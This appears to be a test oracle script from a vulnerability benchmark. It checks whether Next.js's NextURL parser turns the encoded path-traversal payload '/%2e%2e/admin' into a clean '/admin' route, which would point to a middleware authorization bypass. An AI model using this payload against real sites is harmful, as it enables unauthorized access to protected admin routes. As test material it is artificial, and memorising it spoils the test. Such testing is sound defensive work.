const path = require('node:path');

function emit(operation_completed, exploit_succeeded, evidence) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

(function main() {
  try {
    const nextPkg = require('next/package.json');
    const version = nextPkg && nextPkg.version ? nextPkg.version : 'unknown';

    const mod = require('next/dist/server/web/next-url');
    if (!mod || typeof mod.NextURL !== 'function') {
      throw new Error('NextURL constructor not available');
    }
    const NextURL = mod.NextURL;

    // Benign operation: prove normal pathname handling works.
    const benignInput = '/dashboard';
    const benignUrl = new NextURL('https://example.test' + benignInput, {
      headers: {},
      nextConfig: {}
    });
    const benignPathname = benignUrl.pathname;
    if (benignPathname !== benignInput) {
      throw new Error('benign operation failed: expected pathname ' + benignInput + ' but got ' + benignPathname);
    }

    // Only after benign success is operation completed.
    let operation_completed = true;

    // Malicious path crafted to exercise middleware authz bypass normalization issues.
    const maliciousRawPath = '/%2e%2e/admin';
    let maliciousPathname;
    let threw = false;
    let thrownMsg = '';
    try {
      const maliciousUrl = new NextURL('https://example.test' + maliciousRawPath, {
        headers: {},
        nextConfig: {}
      });
      maliciousPathname = maliciousUrl.pathname;
    } catch (e) {
      threw = true;
      thrownMsg = e && e.message ? e.message : String(e);
      maliciousPathname = '(threw)';
    }

    const decodedRaw = decodeURIComponent(maliciousRawPath);
    const endsInAdmin = /\/admin$/.test(maliciousPathname || '');
    const stillEncodedTraversal = /%2e/i.test(maliciousPathname || '');

    // Vulnerable behavior: malformed traversal path is accepted/normalized into a routable admin path.
    // Patched behavior should reject or avoid producing a clean admin-target pathname.
    const exploit_succeeded = !threw && endsInAdmin && !stillEncodedTraversal;

    emit(operation_completed, exploit_succeeded, JSON.stringify({
      version,
      module: 'next/dist/server/web/next-url',
      benignInput,
      benignPathname,
      maliciousRawPath,
      maliciousDecoded: decodedRaw,
      maliciousPathname,
      maliciousThrew: threw,
      maliciousThrowMessage: thrownMsg,
      exploitRule: 'success when encoded traversal payload is accepted and normalizes to an /admin pathname'
    }));
  } catch (e) {
    emit(false, false, e && e.stack ? e.stack : String(e));
  }
})();